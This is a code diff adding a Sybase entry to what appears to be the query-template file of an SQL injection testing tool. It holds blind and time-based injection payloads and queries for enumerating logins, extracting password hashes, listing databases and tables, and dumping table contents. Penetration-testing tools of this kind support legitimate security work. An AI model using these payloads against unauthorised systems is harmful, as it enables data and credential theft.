@@ -428,4 +428,65 @@
         <substring query="SUBSTR((%s), %d, %d)"/>
    </dbms>
 
+    <!-- Sybase -->
+    <dbms value="Sybase">
+        <cast query="CAST(%s AS VARCHAR(8000))"/>
+        <length query="LTRIM(STR(LEN(%s)))"/>
+        <isnull query="ISNULL(%s, ' ')"/>
+        <delimiter query="+"/>
+        <limit query="SELECT TOP %d "/>
+        <limitregexp query="TOP\s+([\d]+)\s+.+?\s+FROM\s+.+?\s+WHERE\s+.+?\s+NOT\s+IN\s+\(SELECT\s+TOP\s+([\d]+)\s+"/>
+        <limitgroupstart query="2"/>
+        <limitgroupstop query="1"/>
+        <limitstring/>
+        <order query="ORDER BY %s ASC"/>
+        <count query="COUNT(%s)"/>
+        <comment query="--" query2="/*"/>
+        <timedelay query="WAITFOR DELAY '0:0:%d'"/>
+        <substring query="SUBSTRING((%s), %d, %d)"/>
+        <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
+        <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
+        <banner query="SELECT @@VERSION"/>
+        <current_user query="SELECT SUSER_NAME()"/>
+        <current_db query="SELECT DB_NAME()"/>
+        <is_dba query="PATINDEX('%sa_role%', SHOW_ROLE())>0"/>
+        <users>
+            <inband query="SELECT name FROM master..syslogins ORDER BY 1" query2="SELECT name FROM sys.sql_logins ORDER BY 1"/>
+            <blind query="SELECT TOP 1 name FROM master..syslogins WHERE name NOT IN (SELECT TOP %d name FROM master..syslogins)" query2="SELECT TOP 1 name FROM sys.sql_logins WHERE name NOT IN (SELECT TOP %d name FROM sys.sql_logins)" count="SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins" count2="SELECT LTRIM(STR(COUNT(name))) FROM sys.sql_logins"/>
+        </users>
+        <passwords>
+            <inband query="SELECT name, password FROM master..syslogins" query2="SELECT name, password_hash FROM sys.sql_logins" condition="name"/>
+            <blind query="SELECT TOP 1 password FROM master..syslogins WHERE name='%s' AND name NOT IN (SELECT TOP %d name FROM master..syslogins WHERE name='%s')" query2="SELECT TOP 1 password_hash FROM sys.sql_logins WHERE name='%s' AND name NOT IN (SELECT TOP %d name FROM sys.sql_logins WHERE name='%s')" count="SELECT LTRIM(STR(COUNT(password))) FROM master..syslogins WHERE name='%s'" count2="SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='%s'"/>
+        </passwords>
+        <privileges/>
+        <roles/>
+        <dbs>
+            <inband query="SELECT name FROM master..sysdatabases ORDER BY 1"/>
+            <blind query="SELECT TOP 1 name FROM master..sysdatabases WHERE name NOT IN (SELECT TOP %d name FROM master..sysdatabases)" count="SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases"/>
+        </dbs>
+        <tables>
+            <inband query="SELECT name FROM %s..sysobjects WHERE type IN ('U') ORDER BY 1"/>
+            <blind query="SELECT TOP 1 name FROM %s..sysobjects WHERE type IN ('U') AND name NOT IN (SELECT TOP %d name FROM %s..sysobjects WHERE type IN ('U'))" count="SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE type IN ('U')"/>
+        </tables>
+        <columns>
+            <inband query="SELECT %s..syscolumns.name, TYPE_NAME(%s..syscolumns.xtype) FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" condition="[DB]..syscolumns.name"/>
+            <blind query="SELECT %s..syscolumns.name FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" query2="SELECT TYPE_NAME(%s..syscolumns.xtype) FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.name='%s' AND %s..syscolumns.id=%s..sysobjects.id AND %s..sysobjects.name='%s'" count="SELECT LTRIM(STR(COUNT(name))) FROM %s..syscolumns WHERE id=(SELECT id FROM %s..sysobjects WHERE name='%s')" condition="[DB]..syscolumns.name"/>
+        </columns>
+        <dump_table>
+            <inband query="SELECT %s FROM %s..%s"/>
+            <blind query="SELECT TOP 1 %s FROM %s..%s WHERE %s NOT IN (SELECT TOP %d %s FROM %s..%s)" count="SELECT LTRIM(STR(COUNT(*))) FROM %s..%s"/>
+        </dump_table>
+        <search_db>
+            <inband query="SELECT name FROM master..sysdatabases WHERE " condition="name"/>
+            <blind query="SELECT name FROM master..sysdatabases WHERE " count="SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases WHERE " condition="name"/>
+        </search_db>
+        <search_table>
+            <inband query="SELECT name FROM %s..sysobjects WHERE type IN ('U') AND " condition="name" condition2="name"/>
+            <blind query="" query2="SELECT name FROM %s..sysobjects WHERE type IN ('U') " count="" count2="SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE type IN ('U')" condition="name" condition2="name"/>
+        </search_table>
+        <search_column>
+            <inband query="SELECT %s..sysobjects.name FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" condition="[DB]..syscolumns.name"/>
+            <blind query="" query2="SELECT %s..sysobjects.name FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" count="" count2="SELECT COUNT(%s..sysobjects.name) FROM %s..syscolumns, %s..sysobjects WHERE %s..syscolumns.id=%s..sysobjects.id" condition="[DB]..syscolumns.name"/>
+        </search_column>
+    </dbms>
 </root>
